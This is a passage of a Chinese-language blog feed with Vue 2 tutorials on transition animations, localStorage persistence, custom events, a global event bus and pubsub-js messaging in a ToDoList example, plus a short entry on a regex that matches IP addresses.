class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">transition-group</span> </span><br><span class="hljs-tag">    <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;animate__animated animate__bounce&quot;</span> //把<span class="hljs-attr">name</span>或者<span class="hljs-attr">class</span>里面的名字改成这个</span><br><span class="hljs-tag">    <span class="hljs-attr">:appear</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">enter-active-class</span>=<span class="hljs-string">&quot;animate__bounceInDown&quot;</span>//这里设置进场动画</span><br><span class="hljs-tag">    <span class="hljs-attr">leave-active-class</span>=<span class="hljs-string">&quot;animate__bounceOutRight&quot;</span>//这里设置离场动画</span><br><span class="hljs-tag">    &gt;</span><span class="hljs-comment">&lt;!-- 直接写appear也可以 --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;!isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span>你好啊！<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;isShow&quot;</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span>World<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">transition-group</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样我们就通过第三方库给我们提供的样式实现了高大上的动画！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://s2.loli.net/2022/04/17/UAKO7egBZRGyQVq.png" alt="总结1.png"></p><p>我们动画的实现过程其实是一个透明度改变的过程，透明度由0变到1,0便是我们的v-enter,而1就是我们的v-enter-to，也就是enter的结束。中间的过程便是我们的v-enter-active，同样，v-leave也是一样的道理。</p><p><img src="https://s2.loli.net/2022/04/17/CdlhNUvEJzPnoSm.png" alt="总结2.png"></p><p>这里我们需要注意的是，我们在写动画的时候只用到了我们的v-enter-active。但是我们写过渡的时候便是三个部分一起写，体现了过渡的整体性。</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>todolist案例拓展</title>
    <link href="/2022/04/10/ToDoList%E6%A1%88%E4%BE%8B%E6%8B%93%E5%B1%95/"/>
    <url>/2022/04/10/ToDoList%E6%A1%88%E4%BE%8B%E6%8B%93%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<h1 id="ToDoList案例拓展"><a href="#ToDoList案例拓展" class="headerlink" title="ToDoList案例拓展"></a>ToDoList案例拓展</h1><h2 id="一-添加localstorage"><a href="#一-添加localstorage" class="headerlink" title="一.添加localstorage"></a>一.添加localstorage</h2><p>localstorage是我们学习的用于在浏览器上永久储存数据的一个方法，他有六个常用API</p><p>setItem，getItem ，key，removeItem，length，clear</p><p>我们添加本地存储的时候需要用到监视属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">watch: &#123;<br>    <span class="hljs-attr">todos</span>: &#123;<br>      <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">//需要监视todos数组的详细属性，需要打开深度监视</span><br>      <span class="hljs-function"><span class="hljs-title">handler</span>(<span class="hljs-params">value</span>)</span> &#123;<br>        <span class="hljs-built_in">localStorage</span>.setItem(<span class="hljs-string">&quot;todos&quot;</span>, <span class="hljs-built_in">JSON</span>.stringify(value)); <span class="hljs-comment">//存到本地需要使用字符串的形式，通过JSON完成</span><br>      &#125;,<br>    &#125;,<br>  &#125;,<br></code></pre></td></tr></table></figure><p>然后是读取问题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">todos</span>: <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">localStorage</span>.getItem(<span class="hljs-string">&#x27;todos&#x27;</span>)) || [], <span class="hljs-comment">//第一次返回null会报错，需要返回一个空数组</span><br>    &#125;;<br>  &#125;,<br></code></pre></td></tr></table></figure><p>tips：</p><p>1.第一次写完读取代码之后一直报错，说todos没有定义，结果是getItem里面的todos没有加 ‘ ‘ ，小伙伴们一定注意。</p><p>2.我们发现整个逻辑没有用到removeItem，是因为我们监视的是todos整个数组，<strong>每次改变就会把todos在本地存储中的值替换。</strong></p><h2 id="二-组件自定义事件"><a href="#二-组件自定义事件" class="headerlink" title="二.组件自定义事件"></a>二.组件自定义事件</h2><p>我们子传父的时候也可以通过自定义事件实现</p><p>总的来说，自定义事件就是通过在vc中添加函数，实现了子向父传值。</p><h3 id="1-添加自定义事件"><a href="#1-添加自定义事件" class="headerlink" title="1.添加自定义事件"></a>1.添加自定义事件</h3><p>第一种类型：</p><p>我们先在一个标签下加入一个vc没有的事件</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript">&lt;School <span class="hljs-meta">@swpu</span>=<span class="hljs-string">&#x27;getSchoolName&#x27;</span>/&gt;<br><span class="hljs-comment">//对应方法</span><br><span class="hljs-function"><span class="hljs-title">getSchoolName</span>(<span class="hljs-params">name</span>)</span> &#123;<br>      <span class="hljs-comment">//通过swpu事件获得了this.name</span><br>      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;学校的名字是: &quot;</span>, name);<br>    &#125;,<br></code></pre></td></tr></table></figure><p>然后在该组件下，创造这个事件的触发条件</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">&lt;button <span class="hljs-meta">@click</span>=<span class="hljs-string">&#x27;sendSchoolName&#x27;</span>&gt;传递学校名字&lt;/button&gt;<br><span class="hljs-comment">//在sendSchoolName的条件下触发事件</span><br>methods: &#123;<br>    sendSchoolName()&#123;<br>      <span class="hljs-keyword">this</span>.$emit(<span class="hljs-string">&#x27;swpu&#x27;</span>,<span class="hljs-keyword">this</span>.name)<span class="hljs-comment">//替代了props，成为信息传递的媒介</span><br>    &#125;<br>  &#125;,<br></code></pre></td></tr></table></figure><p>$emit函数包括了自定义事件的名字和它所携带的参数，通过这个参数我们就可以实现子向父传参。</p><p>第二种类型：</p><p>我们可以通过ref直接拿到School的原型</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">School</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;school&quot;</span> /&gt;</span><br><span class="hljs-comment">&lt;!-- 储存School的vc为school --&gt;</span><br></code></pre></td></tr></table></figure><p>然后就可以在一些情况下自由调用getStudentName方法</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mounted</span><span class="hljs-params">()</span></span> &#123;<br>    this.<span class="hljs-variable">$refs</span><span class="hljs-selector-class">.school</span>.<span class="hljs-variable">$on</span>(<span class="hljs-string">&quot;swpu&quot;</span>, this.getSchoolName)<br>    <span class="hljs-comment">//通过refs拿到School的vc，然后在触发swpu事件的条件下，调用getSchoolName方法,而且可以实现延时发送</span><br>  &#125;,<br></code></pre></td></tr></table></figure><h3 id="2-解绑自定义事件"><a href="#2-解绑自定义事件" class="headerlink" title="2.解绑自定义事件"></a>2.解绑自定义事件</h3><p>我们就用到$off()</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">this</span>.$off(<span class="hljs-string">&#x27;swpu&#x27;</span>)<br><span class="hljs-keyword">this</span>.$off([<span class="hljs-string">&#x27;swpu1&#x27;</span>,<span class="hljs-string">&#x27;swpu2&#x27;</span>])<span class="hljs-comment">//解绑多个以数组形式</span><br><span class="hljs-keyword">this</span>.$off()<span class="hljs-comment">//解绑全部</span><br></code></pre></td></tr></table></figure><p>或者使用$destory()销毁vc（组件实例对象）也可以实现解绑</p><h3 id="3-自定义事件给data数据传值"><a href="#3-自定义事件给data数据传值" class="headerlink" title="3.自定义事件给data数据传值"></a>3.自定义事件给data数据传值</h3><p>在我们上面的第二种形式下：通过this传值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">getSchoolName</span>(<span class="hljs-params">name</span>)</span> &#123;<br>      <span class="hljs-comment">//通过swpu事件获得了this.name</span><br>      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;学校的名字是: &quot;</span>, name);<br>      <span class="hljs-built_in">this</span>.schoolName = name;<br>    &#125;,<br></code></pre></td></tr></table></figure><p>但是在下面，mounted钩子中需要用到箭头函数</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">this</span>.$refs.school.$<span class="hljs-literal">on</span>(<span class="hljs-string">&quot;swpu&quot;</span>, <span class="hljs-function"><span class="hljs-params">(name)</span> =&gt;</span> &#123;<br>     <span class="hljs-regexp">//</span>里面的<span class="hljs-built_in">this</span>是触发事件的对象=》student,所以使用箭头函数<br>     <span class="hljs-built_in">this</span>.schoolName = name;<br>   &#125;);<br></code></pre></td></tr></table></figure><p>因为箭头函数没有自己的this，向外找到了mounted，而像method中的this都是当前组件的vc</p><h3 id="4-修改todolist案例"><a href="#4-修改todolist案例" class="headerlink" title="4.修改todolist案例"></a>4.修改todolist案例</h3><p>于是我们就可以将我们原案例中的子传父，全部改成自定义事件了</p><p>举个例子：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>将MyHeader中的receive改成自定义事件<br>&lt;MyHeader @receive=<span class="hljs-string">&quot;receive&quot;</span> /&gt;<br><span class="hljs-regexp">//</span>原来有receive的地方就改成<br>this.<span class="hljs-variable">$emit</span>(<span class="hljs-string">&#x27;receive&#x27;</span>,t)<br></code></pre></td></tr></table></figure><p>十分好用！</p><h2 id="三-全局事件总线"><a href="#三-全局事件总线" class="headerlink" title="三 . 全局事件总线"></a>三 . 全局事件总线</h2><p>帮助我们的组件通信，实现任意组件间的通信，而实现这样的通信的这个线也就是 X ，需要几个特点</p><p><img src="https://s2.loli.net/2022/04/17/rxIdPbR2EcmBO1o.png" alt="全局事件总线.png"></p><p>而我们之前学习vc原型对象的时候说过，vc的原型对象是和vue的原型对象有联系的，也就是我们这个vue原型对象很符合我们 X 的要求。</p><p>所以我们回到main.js 文件</p><h3 id="1-定义事件总线"><a href="#1-定义事件总线" class="headerlink" title="1.定义事件总线"></a>1.定义事件总线</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">new</span> Vue(&#123;<br>    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>,<br>    <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> h(App),<br>    <span class="hljs-comment">// 在载入前安装全局事件总线</span><br>    <span class="hljs-function"><span class="hljs-title">beforeCreate</span>(<span class="hljs-params"></span>)</span> &#123;<br>        Vue.prototype.$bus=<span class="hljs-built_in">this</span><span class="hljs-comment">//这里的this就是new的vue</span><br>    &#125;,<br>&#125;)<br></code></pre></td></tr></table></figure><p>然后我们在两个组件中使用自定义事件</p><h3 id="2-传输数据："><a href="#2-传输数据：" class="headerlink" title="2.传输数据："></a>2.传输数据：</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>一号组件<br>methods: &#123;<br>   sendStudentName()&#123;<br>     this.<span class="hljs-variable">$bus</span>.<span class="hljs-variable">$emit</span>(<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-number">666</span>)<span class="hljs-regexp">//</span>触发事件，传输数据<br>   &#125;<br> &#125;,<br></code></pre></td></tr></table></figure><h3 id="3-接收数据："><a href="#3-接收数据：" class="headerlink" title="3.接收数据："></a>3.接收数据：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//二号组件</span><br><span class="hljs-function"><span class="hljs-title">mounted</span>(<span class="hljs-params"></span>)</span> &#123;<br>    <span class="hljs-built_in">this</span>.$bus.$on(<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">x</span>)=&gt;</span>&#123;<br>      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;我是School收到了 &quot;</span>+x);<br>    &#125;)<br>  &#125;,<br></code></pre></td></tr></table></figure><p>然后在我们使用完这个事件之后最好解绑一下，免得$bus身上的太多了</p><h3 id="4-解绑数据"><a href="#4-解绑数据" class="headerlink" title="4.解绑数据"></a>4.解绑数据</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 使用完之后销毁,解绑,在school销毁后也销毁hello<br>  beforeDestroy() &#123;<br>    this.<span class="hljs-variable">$bus</span>.<span class="hljs-variable">$off</span>(<span class="hljs-string">&#x27;hello&#x27;</span>)<br>  &#125;,<br></code></pre></td></tr></table></figure><h3 id="5-修改todolist案例"><a href="#5-修改todolist案例" class="headerlink" title="5.修改todolist案例"></a>5.修改todolist案例</h3><p>在我们案例中可不是所有的通信都是最好使用全局事件总线，父子通信可以使用props和自定义方法</p><p>在我们的案例中App和MyItem这两个是爷孙关系的组件就很适合我们的$bus</p><p>我们不再需要使用MyList作为中介，所以在删掉相关代码之后</p><p>1.在main.js 中加入事件总线</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">beforeCreate</span><span class="hljs-params">()</span></span> &#123;<br>        Vue<span class="hljs-selector-class">.prototype</span>.<span class="hljs-variable">$bus</span>=this<span class="hljs-comment">//这里的this就是new的vue</span><br>    &#125;,<br></code></pre></td></tr></table></figure><p>2.给数据传输方，也就是我们的MyItem加入自定义事件的$emit</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xquery">methods: &#123;<br>   handler<span class="hljs-built_in">(id</span>)&#123;<br>     this.<span class="hljs-variable">$bus</span>.<span class="hljs-variable">$emit</span>(<span class="hljs-string">&#x27;checkTodo&#x27;</span><span class="hljs-built_in">,id</span>)    <br>   &#125;,<br>   handleDelete<span class="hljs-built_in">(id</span>)&#123;<br>     <span class="hljs-keyword">if</span>(confirm(<span class="hljs-string">&#x27;确定删除吗？&#x27;</span>))&#123;<br>       //通知App删除<br>       this.<span class="hljs-variable">$bus</span>.<span class="hljs-variable">$emit</span>(<span class="hljs-string">&#x27;deleteTodo&#x27;</span><span class="hljs-built_in">,id</span>)<br>     &#125;<br>   &#125;<br> &#125;,<br></code></pre></td></tr></table></figure><p>3.给数据的接收方，也就是我们的App组件加入$on</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">mounted() &#123;<br>    <span class="hljs-keyword">this</span>.$bus.$on(<span class="hljs-string">&#x27;checkTodo&#x27;</span>,<span class="hljs-keyword">this</span>.checktodo)<br>    <span class="hljs-keyword">this</span>.$bus.$on(<span class="hljs-string">&#x27;deleteTodo&#x27;</span>,<span class="hljs-keyword">this</span>.deletetodo)<br>  &#125;,<br>  <span class="hljs-comment">// 解绑</span><br>  beforeDestroy()&#123;<br>    <span class="hljs-keyword">this</span>.$bus.$off(<span class="hljs-string">&#x27;checkTodo&#x27;</span>)<br>    <span class="hljs-keyword">this</span>.$bus.$off(<span class="hljs-string">&#x27;deleteTodo&#x27;</span>)<br>  &#125;<br></code></pre></td></tr></table></figure><p>这样我们的非亲组件通信就完成了！</p><h2 id="四-消息订阅与发布"><a href="#四-消息订阅与发布" class="headerlink" title="四. 消息订阅与发布"></a>四. 消息订阅与发布</h2><p>消息订阅与发布需要一个库 =》pubsub</p><p>我们使用 <code>npm i pubsub-js</code>实现库的安装</p><h3 id="1-发布消息："><a href="#1-发布消息：" class="headerlink" title="1.发布消息："></a>1.发布消息：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//发布消息</span><br><span class="hljs-keyword">import</span> pubsub <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;pubsub-js&#x27;</span> <span class="hljs-comment">//引入pubsub库</span><br><span class="hljs-comment">//pubsub.publish实现消息的发布</span><br><span class="hljs-attr">methods</span>: &#123;<br>    <span class="hljs-function"><span class="hljs-title">sendStudentName</span>(<span class="hljs-params"></span>)</span>&#123;<br>      pubsub.publish(<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-number">666</span>)<br>    &#125;<br>  &#125;,<br></code></pre></td></tr></table></figure><h3 id="2-接收消息："><a href="#2-接收消息：" class="headerlink" title="2.接收消息："></a>2.接收消息：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//引入库</span><br><span class="hljs-keyword">import</span> pubsub <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;pubsub-js&#x27;</span><br><span class="hljs-comment">//先写方法</span><br><span class="hljs-attr">methods</span>: &#123;<br>    <span class="hljs-function"><span class="hljs-title">demo</span>(<span class="hljs-params">msgName,data</span>)</span>&#123;<br>      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;hello消息收到了&#x27;</span>+data,<span class="hljs-built_in">this</span>);<span class="hljs-comment">//这样子写的this就是vc</span><br>    &#125;<br>  &#125;,<br>  <br><span class="hljs-comment">//调用实现方法</span><br><span class="hljs-function"><span class="hljs-title">mounted</span>(<span class="hljs-params"></span>)</span> &#123;<br>   <span class="hljs-built_in">this</span>.pubid = pubsub.subscribe(<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">msgname,data</span>)=&gt;</span>&#123;<span class="hljs-comment">//a是消息名=》hello,b是传过来的参数</span><br>      <span class="hljs-comment">// 这里函数里面的this是undefined，所以需要使用箭头函数</span><br>      <span class="hljs-built_in">this</span>.pubid = pubsub.subscribe(<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-built_in">this</span>.demo)<br>    &#125;)<br>  &#125;,<br>  <br><span class="hljs-comment">//取消订阅</span><br> <span class="hljs-function"><span class="hljs-title">beforeDestroy</span>(<span class="hljs-params"></span>)</span> &#123;<br>    <span class="hljs-comment">// this.$bus.$off(&#x27;hello&#x27;)</span><br>    pubsub.unsubscribe(<span class="hljs-built_in">this</span>.pubid)<span class="hljs-comment">//this.pubid拿到id，取消订阅</span><br>  &#125;,<br></code></pre></td></tr></table></figure><h3 id="3-修改todolist案例"><a href="#3-修改todolist案例" class="headerlink" title="3.修改todolist案例"></a>3.修改todolist案例</h3><p>这里与事件总线的写法有类似之处，就不赘述了</p><p>发布消息：</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gml">methods: &#123;<br>    handler(<span class="hljs-symbol">id</span>)&#123;<br>      pubsub.publish(<span class="hljs-string">&#x27;checkTodo&#x27;</span>,<span class="hljs-symbol">id</span>)<br>    &#125;,<br>    handleDelete(<span class="hljs-symbol">id</span>)&#123;<br>      <span class="hljs-keyword">if</span>(confirm(<span class="hljs-string">&#x27;确定删除吗？&#x27;</span>))&#123;<br>        <span class="hljs-comment">//通知App删除</span><br>        pubsub.publish(<span class="hljs-string">&#x27;deleteTodo&#x27;</span>,<span class="hljs-symbol">id</span>)<br>    &#125;<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p>接收消息和取消订阅：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">mounted</span>(<span class="hljs-params"></span>)</span> &#123;<br>    <span class="hljs-built_in">this</span>.pubid1 = pubsub.subscribe(<span class="hljs-string">&quot;deleteTodo&quot;</span>, <span class="hljs-built_in">this</span>.deletetodo);<br>    <span class="hljs-built_in">this</span>.pubid2 = pubsub.subscribe(<span class="hljs-string">&quot;checkTodo&quot;</span>, <span class="hljs-built_in">this</span>.checktodo);<br>  &#125;,<br>  <span class="hljs-function"><span class="hljs-title">beforeDestroy</span>(<span class="hljs-params"></span>)</span> &#123;<br>    pubsub.unsubscribe(<span class="hljs-string">&quot;pubid1&quot;</span>);<br>    PubSub.unsubscribe(<span class="hljs-string">&quot;pubid2&quot;</span>);<br>  &#125;,<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脚手架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式</title>
    <link href="/2022/04/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2022/04/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="1-常用的正则表达式"><a href="#1-常用的正则表达式" class="headerlink" title="1.常用的正则表达式"></a>1.常用的正则表达式</h2><p><img src="https://s2.loli.net/2022/04/17/2C6lbuqxSWmHhoa.png" alt="常用正则表达式.png"></p><p>这些都是常用的正则表达式的值</p><h2 id="2-下面是一个实例"><a href="#2-下面是一个实例" class="headerlink" title="2.下面是一个实例"></a>2.下面是一个实例</h2><p><strong>这个是匹配0-255的表达式</strong>：[0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5]，我们来分析一下</p><p>首先明确 |  起到分割的作用，也就是一个分割一种情况</p><p>第一个 | 之前是一个一位数，匹配[0,9]之间的所有数字</p><p>第二个 | [1-9] [0-9] 是代表的一个两位数，匹配10-99的所有数字</p><p>第三个 | 1 [0-9] {2}，其中1代表第一个字符需要是1，{2}是代表[0-9]要匹配两次，也就是这里匹配了100-199的所有数字</p><p>第四个 | 25 [0-5] ，25和之前一样代表前两位是25 ，第三位就是[0-5]之间的数</p><p><strong>tips：</strong>我们可以看出来正则表达式需要我们对于字符串先进行分析，对于不同的匹配情况，使用 | 进行逻辑运算</p><p>那么我们对于这个做一个拓展，我们重复三次这样子的匹配</p><p>首先把上面的字符串打包：([0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5])\ . </p><p> 又为了防止我们的数据出现 () ，我们将其变成 (?:[0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5])\ . </p><p>打包完成之后将这个重复三次匹配：(?:(?:[0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5])\ .){3}</p><p>我们再进行这样的一次匹配，返现就可以得到我们的 <code>ip</code> 地址匹配</p><p>^(?:(?:[0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5])\ .){3}(?:[0-9]|[1-9] [0-9]|1[0-9]{2}|2[0-4] [0-9]|25[0-5])$</p><p>需要注意的是需要对匹配串进行^ 和 $  的打包。 </p>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ToDoList案例</title>
    <link href="/2022/04/09/ToDoList%20%E6%A1%88%E4%BE%8B/"/>
    <url>/2022/04/09/ToDoList%20%E6%A1%88%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="ToDoList-案例"><a href="#ToDoList-案例" class="headerlink" title="ToDoList 案例"></a><code>ToDoList</code> 案例</h1><p>我们在编码前端工程的时候，需要按照一定的顺序</p><p><img src="https://s2.loli.net/2022/04/09/BfNzG8mHwxLYsrj.png" alt="案例分析.png"></p><p>对于我们的<code>todolist</code>案例，我们首先第一步是根据功能和构造拆分组件（根据图中所示，不再赘述），然后实现静态组件</p><h2 id="part-one-静态组件"><a href="#part-one-静态组件" class="headerlink" title="part one . 静态组件"></a>part one . 静态组件</h2><p>我们拆分完组件之后就在脚手架中建立我们的components下的组件，然后父组件引入子组件，<code>App</code>组件再引入非子组件</p><p>我们得到的结构应该是这样的：</p><p><img src="https://s2.loli.net/2022/04/09/CRky95aDzstZVY7.png" alt="组件结构.png"></p><p>其中<code>MyItem</code>组件是<code>MyList</code>组件的子组件，所以需要在<code>MyList</code>组件中引入和注册我们的<code>MyItem</code>组件</p><p>写上HTML和CSS代码后，我们得到了静态页面和我们的Vue结构</p><p><img src="https://s2.loli.net/2022/04/09/Bbc7TeFWnkzs18I.png" alt="静态页面和Vue结构.png"></p><h2 id="part-two-展示动态数据"><a href="#part-two-展示动态数据" class="headerlink" title="part two.展示动态数据"></a>part two.展示动态数据</h2><h3 id="我们需要关注的第一个问题是，数据类型是什么？"><a href="#我们需要关注的第一个问题是，数据类型是什么？" class="headerlink" title="我们需要关注的第一个问题是，数据类型是什么？"></a><em><strong>我们需要关注的第一个问题是，数据类型是什么？</strong></em></h3><p>首先我们可以确定这个数据是要放在<code>mylist</code>文件中的，这里我们使用的是一个对象数组，因为数组可以方便遍历，而对象又可以体现数据的各个特征</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-keyword">return</span> &#123;<br>      todos:[<span class="hljs-comment">//返回一个对象数组</span><br>      &#123;<span class="hljs-symbol">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,title:<span class="hljs-string">&#x27;吃饭&#x27;</span>,done:<span class="hljs-literal">true</span>&#125;,<span 